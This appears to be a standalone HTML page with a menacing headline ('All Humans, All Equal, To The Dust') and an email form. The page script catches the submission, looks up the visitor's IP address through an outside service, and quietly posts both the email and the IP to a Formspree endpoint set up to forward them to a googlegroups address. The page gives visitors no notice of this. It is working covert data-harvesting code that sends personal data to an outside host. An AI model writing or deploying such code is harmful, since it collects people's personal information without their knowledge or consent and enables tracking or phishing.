<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send IP Address Automatically</title>
</head>
<body>
  <center>
    <h1 style="color:#00ff00">All Humans, All Equal, To The Dust</h1>
    <p>This is a sample text to capture and send automatically via email.</p>

    <!-- Email input form -->
    <form id="emailForm">
      <label for="email">Your Email:</label>
      <input type="email" id="email" name="email" required>
      <button type="submit">Submit</button>
    </form>
  </center>

  <script>
    // Function to send data when the page loads
    window.onload = function() {
      document.getElementById('emailForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent form from submitting normally

        const userEmail = document.getElementById('email').value; // Get the user's email

        if (!userEmail) {
          console.error("Email is required!");
          return;
        }

        // Immediately fetch the user's IP address
        fetch("https://ipwhois.app/json/")
          .then(response => response.json())
          .then(data => {
            const userIP = data.ip; // Get the user's IP address

            // Combine the email, IP address, and message content into one
            const emailMessage = `User Email: ${userEmail}\nUser IP: ${userIP}`;

            // Prepare form data (this simulates a form submission)
            const formData = new FormData();
            formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
            formData.append("subject", "Captured User Email and IP from Webpage");
            formData.append("message", emailMessage);

            // Send the form data to Formspree endpoint
            fetch("https://formspree.io/f/movqwbek", {
              method: "POST",
              body: formData,
            })
            .then(response => {
              if (response.ok) {
                console.log("Email sent successfully!");
              } else {
                console.error("Error sending email. Response: ", response.status);
              }
            })
            .catch(error => {
              console.error("Error sending email:", error);
            });
          })
          .catch(error => {
            console.error("Error fetching IP address:", error);
          });
      });
    };
  </script>
</body>
</html>
